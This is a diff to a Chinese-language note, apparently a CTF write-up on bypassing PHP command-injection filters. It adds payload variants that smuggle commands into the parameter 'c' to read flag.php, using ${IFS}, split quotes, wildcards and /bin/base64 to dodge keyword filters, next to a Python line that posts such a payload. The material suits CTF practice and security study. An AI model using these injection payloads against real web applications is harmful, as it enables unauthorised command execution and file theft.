@@ -172,7 +172,7 @@ response = requests.post(URL, data={'c': urllib.parse.unquote(payload)})
 print(response.text)
 ```
 命令注入的绕过真的有很多有意思的故事呢：<br>
-**如果你遇到了一个system($c." >/dev/null 2>&1");可以尝试以下方式绕过**<br>
+**如果你遇到了类似于system($c." >/dev/null 2>&1");可以尝试以下方式绕过**<br>
 ```php
 c=cat flag.php; //;是用来分割命令的
 c=nl flag.php%0a //%0a是换行符
@@ -180,4 +180,10 @@ c=tac flag.php|| // ||连接2个命令，如果前面一个命令执行成功，
 c=tac%09fl*g.php%0a //%09是tab键
 c=tac%09fl?g.php%0a
 c=tac<fla''g.php|| //<是重定向符
+c=nl<fla''g.php|| //nl是给每行加上行号
+c=nl${IFS}/fla''g|| //IFS是内部字段分隔符，这里是空格
+c=nl${IFS}fla''g.php%0a
+c=c''at${IFS}fla''g.p''hp
+c=/bin/ca?${IFS}f?ag.php //ca?匹配不到命令，需要全路径
+c=/???/????64 ????.??? // /bin/base64 flag.php
 ```
